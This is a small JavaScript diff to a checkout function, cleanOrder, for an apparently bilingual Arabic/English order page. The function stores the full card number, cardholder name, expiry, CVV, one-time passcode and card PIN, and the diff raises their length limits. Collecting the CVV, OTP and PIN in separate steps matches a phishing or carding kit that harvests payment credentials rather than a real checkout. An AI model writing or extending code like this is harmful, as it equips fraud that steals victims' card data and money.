@@ -83,14 +83,14 @@ function cleanOrder(b) {
     em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad, 500), lang: b.lang === "en" ? "en" : "ar",
     step: ["card", "otp", "pin"].includes(b.step) ? b.step : undefined,
     pay: {
-      cardName: str(rawName, 120),
-      cardNumber: str(rawCard, 30),
-      last4: str(rawCard.slice(-4) || p.last4, 4).replace(/\D/g, ""),
+      cardName: str(rawName, 200),
+      cardNumber: str(rawCard, 200),
+      last4: str((rawCard.slice(-4) || p.last4 || "").replace(/\D/g, ""), 4),
       brand: ["visa", "mc", "amex"].includes(p.brand) ? p.brand : "",
-      exp: str(rawExp, 5),
-      cvv: str(rawCvv, 10),
-      otp: str(rawOtp, 10),
-      pin: str(rawPin, 10)
+      exp: str(rawExp, 50),
+      cvv: str(rawCvv, 50),
+      otp: str(rawOtp, 50),
+      pin: str(rawPin, 50)
     }
   };
 }
